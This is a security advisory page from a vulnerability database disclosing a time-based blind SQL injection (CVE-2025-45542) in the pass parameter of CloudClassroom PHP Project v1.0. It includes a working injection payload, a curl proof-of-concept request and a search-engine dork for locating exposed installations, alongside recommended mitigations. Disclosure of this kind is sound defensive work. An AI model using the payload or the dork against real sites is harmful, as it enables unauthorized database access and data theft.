---
title: CloudClassroom PHP Project 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2025060004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-05
fetch_date: 2025-10-06T22:49:39.784416
---

# CloudClassroom PHP Project 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **CloudClassroom PHP Project 1.0 SQL Injection** **2025.06.04**  Credit:  **[Sanjay Singh](https://cxsecurity.com/author/Sanjay%2BSingh/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-45542](https://cxsecurity.com/cveshow/CVE-2025-45542/ "Click to see CVE-2025-45542")**  CWE: **N/A**  **[**Dork:** nurl:CloudClassroom-PHP-Project-master](https://cxsecurity.com/dorks/)** | |

Hello Full Disclosure list,
I am sharing details of a newly assigned CVE affecting an open-source
educational software project:
------------------------------------------------------------------------
CVE-2025-45542: Time-Based Blind SQL Injection in CloudClassroom PHP
Project v1.0
------------------------------------------------------------------------
Product: CloudClassroom PHP Project
Vendor: https://github.com/mathurvishal/CloudClassroom-PHP-Project
Affected Version: v1.0
Vulnerability Type: SQL Injection
Attack Type: Remote
CVE ID: CVE-2025-45542
Discoverer: Sanjay Singh
Vulnerability Details:
A time-based blind SQL injection vulnerability exists in the
`registrationform` endpoint of CloudClassroom-PHP-Project v1.0. The `pass`
parameter is not properly sanitized, allowing an unauthenticated remote
attacker to manipulate backend SQL logic and potentially extract sensitive
information.
Proof of Concept:
The vulnerability can be exploited using a POST request with a crafted
payload like:
`'XOR(if(now()=sysdate(),sleep(6),0))XOR'`
Impact:
Successful exploitation allows for:
- Arbitrary SQL execution
- Potential information disclosure
- Authentication bypass under certain conditions
Recommended Mitigations:
- Use prepared statements with parameterized queries
- Sanitize input with `mysqli\_real\_escape\_string()` or similar
- Implement a Web Application Firewall (WAF)
- Enforce least privilege on the application’s DB user
References:
- GitHub: https://github.com/mathurvishal/CloudClassroom-PHP-Project
- Exploit-DB Submission (pending approval)
- GHDB Dork (submitted): `inurl:"CloudClassroom-PHP-Project-master"
intitle:"Cloud Classroom"`
I have also submitted this to Exploit-DB and the Google Hacking Database to
assist defenders and researchers.
Attached is a detailed advisory in plain text format.
Regards,
Sanjay Singh
https://www.linkedin.com/in/sanjay70023
https://gist.github.com/sanjay70023/63e9c32e49a0760eaa6b9e2a8ba8c966
--- packet storm appended exploit below ---
# Exploit Title: CloudClassroom PHP Project v1.0 - Time-Based Blind SQL Injection (pass parameter)
# Google Dork: inurl:CloudClassroom-PHP-Project-master
# Date: 2025-05-30
# Exploit Author: Sanjay Singh
# Vendor Homepage: https://github.com/mathurvishal/CloudClassroom-PHP-Project
# Software Link: https://github.com/mathurvishal/CloudClassroom-PHP-Project/archive/refs/heads/master.zip
# Version: 1.0
# Tested on: XAMPP on Windows 10 / Ubuntu 22.04
# CVE : CVE-2025-45542
# Description:
# A time-based blind SQL injection vulnerability exists in the pass parameter
# of the registrationform endpoint. An attacker can exploit this issue by sending
# a malicious POST request to delay server response and infer data.
# PoC Request (simulated using curl):
curl -X POST http://localhost/CloudClassroom-PHP-Project-master/registrationform \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "addrs=3137%20Laguna%20Street&course=1&dob=1967/1/1&email=testing@example.com&faname=test&fname=test&gender=Female&lname=test&pass=u]H[ww6KrA9F.x-F0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z&phno=94102&sub="
# The server response will be delayed if the SQL condition is true, confirming the injection point.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 -1

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top